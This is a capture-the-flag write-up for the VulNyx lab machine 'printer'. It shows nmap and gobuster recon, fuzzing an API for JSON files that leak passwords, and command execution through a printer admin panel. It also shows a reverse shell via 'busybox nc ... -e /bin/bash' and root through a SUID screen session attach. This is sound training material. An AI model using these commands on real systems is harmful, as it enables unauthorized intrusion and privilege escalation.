# printer

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| printer | d4t4s3c | Easy | VulNyx |

**Summary:** The printer machine exposed SSH on port 22, an Apache web server on port 80, and a Konica Minolta Printer Admin Panel on port 9999 protected by a password prompt. Gobuster discovered an `/api/` directory, and further enumeration revealed `/api/printers/` with a search interface accepting the format `printer<id>.<ext>`. Fuzzing for JSON files uncovered `printer1.json` containing the password `P4ssw0rd!`, and a numeric ID sweep found `printer1599.json` with the password `$3cUr3Pr1nT3RP4ZZw0rD`. This second password was used to authenticate to the printer admin panel on port 9999, where the `exec` command allowed arbitrary command execution. A reverse shell was obtained as the `printer` user using `busybox nc`. Sudo was not available, but a SUID scan revealed `/usr/bin/screen` with the SUID bit set. Exploiting screen's ability to attach to a root session through `screen -x root/` delivered a full root shell for flag retrieval.

---

## Reconnaissance

The engagement began by locating the target on the local network and enumerating its TCP attack surface.

1. An Nmap host discovery sweep identified the target at `192.168.56.169`:

```zsh
~/projects/labs/nyx                                                                17s 15:01:26  
❯ sudo nmap -sn -PR 192.168.56.0/24  
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-04 15:01 +0700  
Nmap scan report for 192.168.56.100  
Host is up (0.000075s latency).  
MAC Address: 08:00:27:2D:13:95 (Oracle VirtualBox virtual NIC)  
Nmap scan report for 192.168.56.169  
Host is up (0.00015s latency).  
MAC Address: 08:00:27:92:B7:D3 (Oracle VirtualBox virtual NIC)  
Nmap scan report for 192.168.56.1  
Host is up.  
Nmap done: 256 IP addresses (3 hosts up) scanned in 4.88 seconds  
```

2. A full TCP scan with service detection found SSH, HTTP, and a Konica Minolta Printer Admin Panel on port 9999:

```zsh
~/projects/labs/nyx                                                                15:01:32  
❯ ip=192.168.56.169  
  
~/projects/labs/nyx                                                                15:01:57  
❯ nmap -p- -sCV -Pn -T4 --min-rate 5000 $ip  
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-04 15:02 +0700  
Nmap scan report for 192.168.56.169  
Host is up (0.0092s latency).  
Not shown: 65532 closed tcp ports (conn-refused)  
PORT     STATE SERVICE VERSION  
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)  
| ssh-hostkey:   
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)  
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)  
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)  
80/tcp   open  http    Apache httpd 2.4.56 ((Debian))  
|_http-server-header: Apache/2.4.56 (Debian)  
|_http-title: Apache2 Debian Default Page: It works  
9999/tcp open  abyss?  
| fingerprint-strings:   
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe:   
|     Konica Minolta Printer Admin Panel  
|     Password:  
|   NULL:   
|_    Konica Minolta Printer Admin Panel  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 190.49 seconds  
```

3. Gobuster discovered an `/api/` directory, and a second scan within it revealed `/api/printers/`:

```zsh
~/projects/labs/nyx                                                                15:10:25  
❯ gobuster dir -u http://$ip/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x txt,php,html  
===============================================================  
Gobuster v3.8.2  
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)  
===============================================================  
[+] Url:                     http://192.168.56.169/  
[+] Method:                  GET  
[+] Threads:                 10  
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt  
[+] Negative Status codes:   404  
[+] User Agent:              gobuster/3.8.2  
[+] Extensions:              txt,php,html  
[+] Timeout:                 10s  
===============================================================  
Starting gobuster in directory enumeration mode  
===============================================================  
index.html           (Status: 200) [Size: 10701]  
api                  (Status: 301) [Size: 314] [--> http://192.168.56.169/api/]  
Progress: 61268 / 882232 (6.94%)^C  
```

4. The `/api/` directory returned a 403 Forbidden, but further enumeration found `/api/printers/` which presented a search interface:

```zsh
~/projects/labs/nyx                                                                15:11:01  
❯ curl -i http://$ip/api/                
HTTP/1.1 403 Forbidden  
Date: Fri, 04 Sep 2026 08:11:00 GMT  
Server: Apache/2.4.56 (Debian)  
Content-Length: 279  
Content-Type: text/html; charset=iso-8859-1  
  
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">  
<html><head>  
<title>403 Forbidden</title>  
</head><body>  
<h1>Forbidden</h1>  
<p>You don't have permission to access this resource.</p>  
<hr>  
<address>Apache/2.4.56 (Debian) Server at 192.168.56.169 Port 80</address>  
</body></html>  
```

```zsh
~/projects/labs/nyx                                                                15:11:01  
❯ gobuster dir -u http://$ip/api/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x txt,php,html  
===============================================================  
Gobuster v3.8.2  
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)  
===============================================================  
[+] Url:                     http://192.168.56.169/api/  
[+] Method:                  GET  
[+] Threads:                 10  
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt  
[+] Negative Status codes:   404  
[+] User Agent:              gobuster/3.8.2  
[+] Extensions:              txt,php,html  
[+] Timeout:                 10s  
===============================================================  
Starting gobuster in directory enumeration mode  
===============================================================  
printers             (Status: 301) [Size: 323] [--> http://192.168.56.169/api/printers/]  
Progress: 17541 / 882232 (1.99%)^C  
```

```zsh
~/projects/labs/nyx                                                                15:11:14  
❯ curl -i http://$ip/api/printers/  
HTTP/1.1 200 OK  
Date: Fri, 04 Sep 2026 08:11:19 GMT  
Server: Apache/2.4.56 (Debian)  
Last-Modified: Thu, 04 May 2023 17:09:13 GMT  
ETag: "12f-5fae13b4db599"  
Accept-Ranges: bytes  
Content-Length: 303  
Vary: Accept-Encoding  
Content-Type: text/html  
  
<!DOCTYPE html>  
<html>  
<head>  
       <title>Search | Printer</title>  
       <style>  
               .highlight {  
                       background-color: yellow;  
                       font-weight: bold;  
               }  
       </style>  
</head>  
<body>  
       <p>Search for your printer with the following format: <span class="highlight">printer&lt;id&gt;.&lt;ext&gt;</span></p>  
</body>  
</html>  
```

---

## Initial Access

### API Credential Discovery and Command Execution

5. The search interface indicated the format `printer<id>.<ext>`. Fuzzing for the `json` extension revealed `printer1.json` containing credentials:

```zsh
~/projects/labs/nyx                                                                15:13:51  
❯ ffuf -u "http://$ip/api/printers/printer1.FUZZ" -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -mc 200     
  
        /'___\  /'___\           /'___\         
       /\ \__/ /\ \__/  __  __  /\ \__/         
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\        
         \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/         
          \ \_\   \ \_\  \ \____/  \ \_\         
           \/_/    \/_/   \/___/    \/_/         
  
       git-20260820-33c67d28  
 ________________________________________________  
  
 :: Method           : GET  
 :: URL              : http://192.168.56.169/api/printers/printer1.FUZZ  
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt  
 :: Follow redirects : false  
 :: Calibration      : false  
 :: Timeout          : 10  
 :: Threads          : 40  
 :: Matcher          : Response status: 200  
 ________________________________________________  
  
json                    [Status: 200, Size: 82, Words: 16, Lines: 7, Duration: 15ms]  
```

```zsh
~/projects/labs/nyx                                                                15:14:40  
❯ curl -s http://$ip/api/printers/printer1.json | jq  
{  
 "printer": {  
  "printer_id": "1",  
  "printer_password": "P4ssw0rd!"  
 }  
}  
```

6. A numeric ID sweep discovered `printer1599.json` with a different, more privileged password:

```zsh
~/projects/labs/nyx                                                                15:14:41  
❯ ffuf -u "http://$ip/api/printers/printerFUZZ.json" -w <(seq 1 9999) -mc 200  
  
        /'___\  /'___\           /'___\         
       /\ \__/ /\ \__/  __  __  /\ \__/         
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\        
         \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/         
          \ \_\   \ \_\  \ \____/  \ \_\         
           \/_/    \/_/   \/___/    \/_/         
  
       git-20260820-33c67d28  
 ________________________________________________  
  
 :: Method           : GET  
 :: URL              : http://192.168.56.169/api/printers/printerFUZZ.json  
 :: Wordlist         : FUZZ: /proc/self/fd/12  
 :: Follow redirects : false  
 :: Calibration      : false  
 :: Timeout          : 10  
 :: Threads          : 40  
 :: Matcher          : Response status: 200  
 ________________________________________________  
  
1                       [Status: 200, Size: 82, Words: 16, Lines: 7, Duration: 13ms]  
2                       [Status: 200, Size: 80, Words: 16, Lines: 7, Duration: 38ms]  
3                       [Status: 200, Size: 79, Words: 16, Lines: 7, Duration: 38ms]  
1599                    [Status: 200, Size: 97, Words: 16, Lines: 7, Duration: 5ms]  
4                       [Status: 200, Size: 78, Words: 16, Lines: 7, Duration: 676ms]  
5                       [Status: 200, Size: 77, Words: 16, Lines: 7, Duration: 927ms]  
:: Progress: [9999/9999] :: Job [1/1] :: 115 req/sec :: Duration: [0:00:04] :: Errors: 0 ::  
```

```zsh
~/projects/labs/nyx                                                                 5s 15:15:27  
❯ curl -s http://$ip/api/printers/printer1599.json | jq             
{  
 "printer": {  
  "printer_id": "1599",  
  "printer_password": "$3cUr3Pr1nT3RP4ZZw0rD"  
 }  
}  
```

7. The printer admin panel on port 9999 was accessed using the credentials from `printer1599.json`. The `exec` command confirmed arbitrary command execution as the `printer` user:

```zsh
~/projects/labs/nyx                                                                15:17:21  
❯ nc $ip 9999  
  
Konica Minolta Printer Admin Panel  
  
                        
Password: $3cUr3Pr1nT3RP4ZZw0rD  
  
Please type "?" for HELP  
> exec id  
uid=1000(printer) gid=1000(printer) grupos=1000(printer)   
```

8. A Penelope listener was started on port 5555, and a reverse shell was triggered through the `exec` command:

```zsh
~/projects/labs/nyx                                                                15:05:11  
❯ penelope -p 5555  
[+] Listening for reverse shells on 0.0.0.0:5555 -> 127.0.0.1 • 192.168.0.6 • 192.168.56.1  
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)  
```

```zsh
> exec busybox nc 192.168.56.1 5555 -e /bin/bash  
```

9. The reverse shell connected as `printer`, providing the initial foothold:

```zsh
[+] [New Reverse Shell] => printer 192.168.56.169 Linux-x86_64 👤 printer(1000) 😍 Session ID <1>  
[+] ⭐ Agent deployed via /usr/bin/python3  
[+] Interacting with session [1] • PTY • Menu key F12 ⇐  
[+] Session log: /home/setyanoegraha/.penelope/sessions/printer~192.168.56.169-Linux-x86_64/2026_09_04-15_17_53-525-printer_1000.log  
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────  
printer@printer:/var/spool/lpd$ cd  
printer@printer:~$ sudo -l  
bash: sudo: orden no encontrada  
```

---

## Privilege Escalation

### SUID screen to Root

10. With sudo unavailable, a SUID binary scan revealed `/usr/bin/screen` with the SUID bit set. The `screen -x root/` command was used to attach to an existing root screen session:

```zsh
printer@printer:~$ find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null  
-rwsr-xr-x 1 root root 55528 ene 20  2022 /usr/bin/mount  
-rwsr-xr-x 1 root root 71912 ene 20  2022 /usr/bin/su  
-rwsr-xr-x 1 root root 58416 feb  7  2020 /usr/bin/chfn  
-rwsr-xr-x 1 root root 88304 feb  7  2020 /usr/bin/gpasswd  
-rwsr-xr-x 1 root root 52880 feb  7  2020 /usr/bin/chsh  
-rwsr-xr-x 1 root root 35040 ene 20  2022 /usr/bin/umount  
-rwsr-xr-x 1 root root 63960 feb  7  2020 /usr/bin/passwd  
-rwsr-xr-x 1 root root 44632 feb  7  2020 /usr/bin/newgrp  
-rwsr-xr-x 1 root root 482312 feb 27  2021 /usr/bin/screen  
-rwsr-xr-x 1 root root 481608 jul  2  2022 /usr/lib/openssh/ssh-keysign  
-rwsr-xr-- 1 root messagebus 51336 oct  5  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper  
```

11. The SUID screen binary was exploited to attach to a root owned screen session, delivering a full root shell. Both flags were retrieved:

```zsh
printer@printer:~$ screen -x root/  
root@printer:~# id;whoami;hostname  
uid=0(root) gid=0(root) grupos=0(root)  
root  
printer  
root@printer:~# cat /home/printer/user.txt /root/root.txt
7cc...  
616...  
```

---

## Attack Chain Summary

1. **Reconnaissance**: Host discovery identified `192.168.56.169` with SSH, HTTP, and a Konica Minolta Printer Admin Panel on port 9999. Gobuster discovered `/api/printers/` with a search interface.

2. **Vulnerability Discovery**: The printer API exposed JSON files containing credentials. Fuzzing discovered `printer1.json` with a low privilege password and `printer1599.json` with an admin password for the port 9999 panel.

3. **Exploitation**: The admin password from `printer1599.json` was used to authenticate to the printer panel, where the `exec` command provided arbitrary command execution. A reverse shell was obtained as `printer` using `busybox nc`.

4. **Internal Enumeration**: Sudo was unavailable, but a SUID scan revealed `/usr/bin/screen` with the SUID bit set, providing a path to privilege escalation through screen session attachment.

5. **Privilege Escalation**: The SUID screen binary was exploited with `screen -x root/` to attach to an existing root session, delivering a root shell for flag retrieval.
